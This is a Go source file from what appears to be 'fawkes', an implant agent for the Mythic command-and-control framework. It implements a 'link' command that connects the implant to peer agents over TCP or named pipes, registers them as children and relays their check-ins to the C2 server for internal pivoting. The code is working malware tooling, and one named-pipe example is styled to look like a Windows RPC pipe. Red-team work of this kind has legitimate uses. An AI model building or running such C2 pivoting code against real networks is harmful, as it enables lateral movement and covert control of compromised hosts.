package commands

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"time"

	"fawkes/pkg/structs"
	"fawkes/pkg/tcp"
)

// tcpProfileInstance is set by main.go when the agent has TCP P2P capability.
// It provides access to child connection management for the link/unlink commands.
var tcpProfileInstance *tcp.TCPProfile

// SetTCPProfile sets the TCP profile instance for link/unlink commands.
func SetTCPProfile(profile *tcp.TCPProfile) {
	tcpProfileInstance = profile
}

// GetTCPProfile returns the TCP profile instance.
func GetTCPProfile() *tcp.TCPProfile {
	return tcpProfileInstance
}

type LinkCommand struct{}

func (c *LinkCommand) Name() string {
	return "link"
}

func (c *LinkCommand) Description() string {
	return "Link to a P2P agent via TCP or named pipe to establish a peer-to-peer connection for internal pivoting"
}

type linkArgs struct {
	Host           string `json:"host"`
	Port           int    `json:"port"`
	ConnectionType string `json:"connection_type"` // "tcp" (default) or "namedpipe"
	PipeName       string `json:"pipe_name"`       // Named pipe name (without \\.\pipe\ prefix)
}

func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[linkArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.ConnectionType == "" {
		args.ConnectionType = "tcp"
	}

	if tcpProfileInstance == nil {
		return errorResult("P2P not available — agent was not built with TCP profile support")
	}

	var conn net.Conn
	var displayAddr string
	var err error

	switch args.ConnectionType {
	case "tcp":
		if args.Host == "" || args.Port == 0 {
			return errorResult("Both host and port are required for TCP link (e.g., {\"host\": \"10.0.0.2\", \"port\": 7777})")
		}
		displayAddr = net.JoinHostPort(args.Host, fmt.Sprintf("%d", args.Port))
		conn, err = net.DialTimeout("tcp", displayAddr, 15*time.Second)

	case "namedpipe":
		if args.Host == "" || args.PipeName == "" {
			return errorResult("Both host and pipe_name are required for named pipe link (e.g., {\"host\": \"10.0.0.2\", \"pipe_name\": \"msrpc-f9a1\"})")
		}
		displayAddr = fmt.Sprintf(`\\%s\pipe\%s`, args.Host, args.PipeName)
		conn, err = dialNamedPipe(args.Host, args.PipeName, 15*time.Second)

	default:
		return errorf("Unknown connection_type: %s. Use: tcp, namedpipe", args.ConnectionType)
	}

	if err != nil {
		return errorf("Failed to connect to %s: %v", displayAddr, err)
	}

	// Read the child's initial checkin message (length-prefixed)
	data, err := recvTCPFramed(conn)
	if err != nil {
		conn.Close()
		return errorf("Failed to read child checkin from %s: %v", displayAddr, err)
	}

	// The child sends base64(UUID + encrypted_body).
	// Decode to extract the child's UUID (first 36 bytes of decoded data).
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil || len(decoded) < 36 {
		conn.Close()
		return errorf("Invalid checkin data from %s", displayAddr)
	}
	childUUID := string(decoded[:36])

	// Register the child connection (AddChildConnection also starts readFromChild goroutine)
	tcpProfileInstance.AddChildConnection(childUUID, conn)

	// Forward the child's checkin as a delegate message to Mythic
	tcpProfileInstance.InboundDelegates <- structs.DelegateMessage{
		Message:       string(data), // Already base64 encoded
		UUID:          childUUID,
		C2ProfileName: "tcp",
	}

	// Send edge notification (P2P graph link)
	tcpProfileInstance.EdgeMessages <- structs.P2PConnectionMessage{
		Source:        tcpProfileInstance.GetCallbackUUID(),
		Destination:   childUUID,
		Action:        "add",
		C2ProfileName: "tcp",
	}

	return successf("Successfully linked to %s via %s (child UUID: %s)", displayAddr, args.ConnectionType, childUUID[:8])
}

// recvTCPFramed reads a length-prefixed TCP message (4-byte big-endian length + payload).
func recvTCPFramed(conn net.Conn) ([]byte, error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}

	length := uint32(header[0])<<24 | uint32(header[1])<<16 | uint32(header[2])<<8 | uint32(header[3])
	if length > 10*1024*1024 {
		return nil, fmt.Errorf("message too large: %d bytes", length)
	}

	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, err
	}
	return data, nil
}
